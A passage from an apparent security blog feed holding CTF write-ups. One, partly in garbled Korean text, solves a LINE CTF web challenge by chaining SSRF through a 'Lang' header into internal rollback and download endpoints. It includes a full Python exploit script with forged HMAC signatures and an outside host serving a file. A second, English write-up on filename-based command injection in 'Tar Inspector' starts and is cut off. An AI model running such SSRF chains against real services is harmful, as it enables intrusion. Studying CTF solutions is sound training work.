 &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno)</span><br><span class="line">        logger.error(err)</span><br></pre></td></tr></table></figure><p>ì²« ë²ˆì§¸ë¡œ <code>api</code> ì„œë²„ì—ì„œ <code>/coin</code>ìœ¼ë¡œ ìš”ì²­ì„ ë³´ë‚´ë©´ <code>LanguageNomarize()</code> í•¨ìˆ˜ì˜ ë°˜í™˜ ê°’ì„ <code>Lang</code>ì´ë¼ëŠ” í—¤ë”ì— ë„£ì–´ì£¼ê³ , <code>getCoinInfo()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ì½”ì¸ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì™€ ì‘ë‹µí•´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LanguageNomarize</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;en&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        regex = <span class="string">&#x27;^[!@#$\\/.].*/.*&#x27;</span> <span class="comment"># Easy~~</span></span><br><span class="line">        language = request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        language = re.sub(<span class="string">r&#x27;%00|%0d|%0a|[!@#$^]|\.\./&#x27;</span>, <span class="string">&#x27;&#x27;</span>, language)</span><br><span class="line">        <span class="keyword">if</span> re.search(regex,language):</span><br><span class="line">            <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = requests.get(request.host_url+language, headers=request.headers)</span><br><span class="line">            <span class="keyword">if</span> data.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> data.text</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>LanguageNomarize()</code> í•¨ìˆ˜ë¥¼ ë³´ë©´ <code>Lang</code>ì´ë¼ëŠ” í—¤ë”ê°€ ì¡´ì¬í•˜ë©´ í—¤ë”ì˜ ê°’ì„ ì •ê·œì‹ìœ¼ë¡œ ê²€ì‚¬ë¥¼ í•˜ê³ , <code>requests.get()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ìš”ì²­ì„ ë³´ë‚´ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ <code>request.host_url</code>ê³¼ <code>language</code>ì˜ ê°’ì€ ìš°ë¦¬ê°€ ì¡°ì‘í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì›í•˜ëŠ” ê³³ìœ¼ë¡œ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— SSRF ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/integrityStatus&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">integritycheck</span>():</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;db&#x27;</span>:<span class="string">&#x27;database/master.db&#x27;</span>,<span class="string">&#x27;dbhash&#x27;</span>:activity.dbHash&#125;</span><br><span class="line">    data = json.dumps(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>ë‘ ë²ˆì§¸ëŠ” <code>/integrityStatus</code>ë¥¼ í™•ì¸í•´ë³´ê² ìŠµë‹ˆë‹¤. í•´ë‹¹ ê²½ë¡œë¡œëŠ” <code>api</code> ì„œë²„ì™€ í†µì‹ í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ìš°ë¦¬ê°€ ì¼ë°˜ì ìœ¼ë¡œëŠ” ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ì—†ìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ SSRF ì·¨ì•½ì ì„ ì´ìš©í•˜ë©´ <code>/integrityStatus</code>ë¡œ ìš”ì²­ì„ í•´ì„œ <code>dbhash</code>ì˜ ê°’ì„ ì•Œì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rollback&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rollback</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Sign&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> SignCheck(request):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Key&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">        result  = activity.IntegrityCheck(request.headers.get(<span class="string">&#x27;Key&#x27;</span>),request.args.get(<span class="string">&#x27;dbhash&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        err = <span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno)</span><br><span class="line">        logger.error(err)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;error&#x27;</span>]), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>ì„¸ ë²ˆì§¸ëŠ” <code>/rollback</code>ì„ ë³´ë©´ <code>SignCheck()</code>ì˜ ê°’ì´ ì°¸ì´ê³ , <code>Key</code>ë¼ëŠ” í—¤ë” ê°’ì´ ì¡´ì¬í•˜ë©´ <code>IntegrityCheck()</code> ë©”ì„œë“œë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntegrityCheck</span>(<span class="params">self,key, dbHash</span>):</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.integrityKey == key:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> self.dbHash != dbHash:</span><br><span class="line">        flag = RunRollbackDB(dbHash)</span><br><span class="line">        logger.debug(<span class="string">&#x27;DB File changed!!&#x27;</span>+dbHash)</span><br><span class="line">        file = <span class="built_in">open</span>(os.environ[<span class="string">&#x27;DBFILE&#x27;</span>],<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        self.dbHash = hashlib.md5(file).hexdigest()</span><br><span class="line">        self.integrityKey = hashlib.sha512((self.dbHash).encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;DB is safe!&quot;</span></span><br></pre></td></tr></table></figure><p><code>IntegrityCheck()</code> ë©”ì„œë“œë¥¼ ë³´ë©´ <code>self.integrityKey</code>ì˜ ê°’ê³¼ <code>Key</code>ì˜ ê°’ì´ ë™ì¼í•˜ê³ , <code>self.dbHash</code> ê°’ê³¼ <code>dbHash</code>ì˜ ê°’ì´ ë™ì¼ í•˜ì§€ ì•Šìœ¼ë©´ <code>RunRollbackDB()</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œì¼œ ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RunRollbackDB</span>(<span class="params">dbhash</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.environ[<span class="string">&#x27;ENV&#x27;</span>] == <span class="string">&#x27;LOCAL&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> dbhash <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dbhash is None&quot;</span></span><br><span class="line">        dbhash = <span class="string">&#x27;&#x27;</span>.join(e <span class="keyword">for</span> e <span class="keyword">in</span> dbhash <span class="keyword">if</span> e.isalnum())</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;backup/&#x27;</span>+dbhash):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Where is file?&quot;</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        logger.error(<span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;exception!!&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>RunRollbackDB()</code>ëŠ” ì•„ê¹Œ ìœ„ì—ì„œ ë´¤ë‹¤ ì‹œí”¼ <code>backup/dbhash</code> íŒŒì¼ì´ ì¡´ì¬í•˜ë©´ <code>FLAG</code> íŒŒì¼ì„ ì½ê³ , ë°˜í™˜í•´ì£¼ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. </p><p>ê·¸ë˜ì„œ ì²˜ìŒì—ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì„¸ì› ì—ˆìŠµë‹ˆë‹¤.</p><ul><li>ì‹œë‚˜ë¦¬ì˜¤ 1</li></ul><ol><li>SSRF ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ <code>/integrityStatus</code>ë¡œ ìš”ì²­ì„ ë³´ë‚´ <code>dbHash</code>ì˜ ê°’ì„ ê°€ì ¸ì˜´</li><li>ê°€ì ¸ì˜¨ dbHash ê°’ì„ ì´ìš©í•´ì„œ <code>/rollback</code>ìœ¼ë¡œ ìš”ì²­ì„ ë³´ë‚´ì„œ FLAGë¥¼ ì½ìŒ</li><li>FLAGëŠ” <code>lang</code>ì´ë¼ëŠ” í—¤ë” ê°’ìœ¼ë¡œ ë°˜í™˜ì´ ë¨</li></ol><p>í•˜ì§€ë§Œ ìœ„ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì´ìš©í•´ì„œ ìµìŠ¤ë¥¼ í•˜ë ¤ í–ˆì§€ë§Œ <code>IntegrityCheck()</code> í•¨ìˆ˜ì—ì„œ <code>self.dbHash</code>ì˜ ê°’ê³¼ <code>dbHash</code>ì˜ ê°’ì´ ë™ì¼í•˜ë©´ ì•ˆ ë˜ê¸° ë•Œë¬¸ì— ê³µê²©ì„ í•  ìˆ˜ ì—†ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WriteFile</span>(<span class="params">url</span>):</span></span><br><span class="line">    local_filename = url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> requests.get(url, stream=<span class="literal">True</span>) <span class="keyword">as</span> r:</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;backup/&#x27;</span>+local_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">8192</span>): </span><br><span class="line">                f.write(chunk)</span><br></pre></td></tr></table></figure><p>ê·¸ë˜ì„œ ë‹¤ì‹œ ì½”ë“œë¥¼ ë¶„ì„í•´ë³´ë‹ˆ, <code>WriteFile()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ <code>backup/</code> ì•„ë˜ì— íŒŒì¼ì„ ë§Œë“¤ì–´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ <code>WriteFile</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ì•„ë¬´ íŒŒì¼ì„ í•˜ë‚˜ ìƒì„±í•´ì£¼ê³ , í•´ë‹¹ íŒŒì¼ì˜ ì´ë¦„ì„ <code>dbHash</code>ë¡œ ì „ì†¡í•´ì£¼ë©´ í´ë˜ìŠ¤ ë‚´ì— ìˆëŠ” ë³€ìˆ˜ì¸ <code>self.dbHash</code>ì˜ ê°’ê³¼ ë™ì¼í•˜ì§€ ì•Šê³ , ë˜ <code>backup/</code> ì•„ë˜ì— ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— ì¶©ë¶„íˆ ìš°íšŒí•´ì„œ í”Œë˜ê·¸ë¥¼ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>WriteFile()</code> í•¨ìˆ˜ ë‚´ë¶€ë¥¼ ë³´ë©´  <code>requests.get()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ìš”ì²­ì„ ë³´ë‚´ê³ , <code>url.split(&#39;/&#39;)[-1]</code>ì˜ ê°’ì„ íŒŒì¼ ì´ë¦„ìœ¼ë¡œ ì‚¬ìš©í•´ ìƒì„±í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Sign&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> SignCheck(request):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            src = request.args.get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> valid_download(src):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;false&#x27;</span>))</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> valid_download(request.form[<span class="string">&#x27;src&#x27;</span>]):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;false&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        WriteFile(src)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;success&#x27;</span>))</span><br></pre></td></tr></table></figure><p><code>WriteFile()</code> í•¨ìˆ˜ëŠ” <code>/download</code>ì—ì„œ í˜¸ì¶œì„ í•˜ëŠ”ë° ì´ë•Œ, <code>Sign</code>ì´ë¼ëŠ” í—¤ë” ê°’ì´ ì¡´ì¬í•˜ê³ , <code>SignCheck()</code> í•¨ìˆ˜ì˜ ë°˜í™˜ ê°’ì´ ì°¸ì´ê³ , <code>src</code> íŒŒë¦¬ë¯¸í„°ì˜ ê°’ì´ ì¡´ì¬í•˜ë©´ <code>WriteFile()</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œì¼œì¤ë‹ˆë‹¤.</p><ul><li>ì‹œë‚˜ë¦¬ì˜¤ 2</li></ul><ol><li>SSRF ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ /downloadë¡œ ìš”ì²­ì„ ë³´ë‚´ì„œ ì„ì˜ì˜ íŒŒì¼ì„ ìƒì„±í•¨.</li><li>ë˜ ë‹¤ì‹œ SSRF ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ /rollbackë¡œ ìš”ì²­ì„ ë³´ë‚´ <code>FLAG</code>ë¥¼ ì½ìŒ </li><li>ì´ë•Œ í•´ë‹¹ íŒŒì¼ì˜ ì´ë¦„ì„ ì´ìš©í•´ì„œ <code>self.dbHash != dbHash</code> êµ¬ë¬¸ì„ ìš°íšŒí•¨.</li><li>ë§ˆì§€ë§‰ìœ¼ë¡œ <code>lang</code> í—¤ë”ë¥¼ ì½ìœ¼ë©´ ë¨.</li></ol><ul><li>ì£¼ì˜ì </li></ul><ol><li>íŒŒì¼ì„ ìƒì„±í•  ë•Œ, <code>requests.get()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ìš”ì²­ì„ ë³´ë‚´ê¸° ë•Œë¬¸ì— íŒŒì¼ì„ ë§Œë“¤ ë•Œ, <code>URL</code>ì„ ì „ì†¡í•´ì„œ ë§Œë“¤ì–´ì£¼ì–´ì•¼ í•¨.</li><li><code>RunRollbackDB()</code> í•¨ìˆ˜ ë‚´ì—ì„œ <code>dbHash</code>ì˜ ê°’ì„ í•œ ë²ˆ ë” íŒŒì‹±í•˜ëŠ”ë°, ì´ë•Œ <code>e.isalnum()</code>ì˜ ê°’ì´ ì°¸ì´ì–´ì•¼ í•¨.</li><li>í”Œë˜ê·¸ë¥¼ ì½ì„ ë•Œ, í™˜ê²½ ë³€ìˆ˜ <code>ENV</code>ì˜ ê°’ì´ <code>Local</code>ì´ ì•„ë‹ˆì—¬ì•¼ í•˜ê¸° ë•Œë¬¸ì— <code>5050</code> í¬íŠ¸ê°€ ì•„ë‹Œ <code>5000</code> í¬íŠ¸ë¥¼ ì‚¬ìš©í•´ì£¼ì–´ì•¼ í•¨.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://35.200.63.50/apis/&#x27;</span></span><br><span class="line"></span><br><span class="line">Key = hashlib.sha512((<span class="string">&#x27;ed05a1c7ff6428dcf8d50901b6e78ba3&#x27;</span>).encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">print(<span class="string">&#x27;[+] Key  : &#x27;</span> + Key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">KEY</span>):</span></span><br><span class="line">    privateKey = <span class="string">b&#x27;let\&#x27;sbitcorinparty&#x27;</span></span><br><span class="line">    EN = hmac.new( privateKey , KEY.encode(<span class="string">&#x27;utf-8&#x27;</span>), hashlib.sha512 )</span><br><span class="line">    <span class="keyword">return</span> EN.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">integrityStatus</span>():</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;/integrityStatus&#x27;</span>&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    print(<span class="string">&#x27;[+] headers in /apis/integreityStatus : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;download?src=http://141.164.52.207/a123&#x27;</span>, <span class="string">&#x27;Sign&#x27;</span>:sign(<span class="string">&#x27;src=http://141.164.52.207/a123&#x27;</span>)&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    print(<span class="string">&#x27;[+] headers in /apis/download : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rollback</span>():</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;/rollback?dbhash=a123&#x27;</span>, <span class="string">&#x27;Sign&#x27;</span>:sign(<span class="string">&#x27;dbhash=a123&#x27;</span>), <span class="string">&#x27;Key&#x27;</span>:Key&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    print(<span class="string">&#x27;[+] headers in /apis/rollback : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    integrityStatus()</span><br><span class="line">    download()</span><br><span class="line">    rollback()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UTCTF 2021 Write Up</title>
      <link href="2021/03/14/2021-03-14-UTCTF-2021/"/>
      <url>2021/03/14/2021-03-14-UTCTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Tar-Inspector-994-pts"><a href="#Web-Tar-Inspector-994-pts" class="headerlink" title=" (Web) Tar Inspector [994 pts]"></a><span style="color:#21C587"></span> (Web) Tar Inspector [994 pts]</h2><blockquote><p>Tar Inspector challenge is get the shell using RCE and read the flag</p></blockquote><p>Many people asked for a hint and the contest provided the code for the secure_filename() function. So first, Iâ€™ll see <code>secure_filename()</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># creates a secured version of the filename</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_filename</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="comment"># strip extension and any sneaky path traversal stuff</span></span><br><span class="line">    filename = filename[:-<span class="number">4</span>]</span><br><span class="line">    filename = os.path.basename(filename)</span><br><span class="line">    <span class="comment"># escape shell metacharacters</span></span><br><span class="line">    filename = re.sub(<span class="string">&quot;(!|\$|#|&amp;|\&quot;|\&#x27;|\(|\)|\||&lt;|&gt;|`|\\\|;)&quot;</span>, <span class="string">r&quot;\\\1&quot;</span>, filename)</span><br><span class="line">    filename = re.sub(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, filename)</span><br><span class="line">    <span class="comment"># add extension</span></span><br><span class="line">    filename += <span class="string">&#x27;__&#x27;</span>+<span class="built_in">hex</span>(randrange(<span class="number">10000000</span>))[<span class="number">2</span>:]+<span class="string">&#x27;.tar&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br></pre></td></tr></table></figure><p>You can see that the secure_filename() function gets the file name excluding the extension, escapes all special characters, and creates a new file name by including a random value between the file names.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/1.png?raw=true"></p><p>Go into the challenge and you can will see the file upload function.</p><p><img 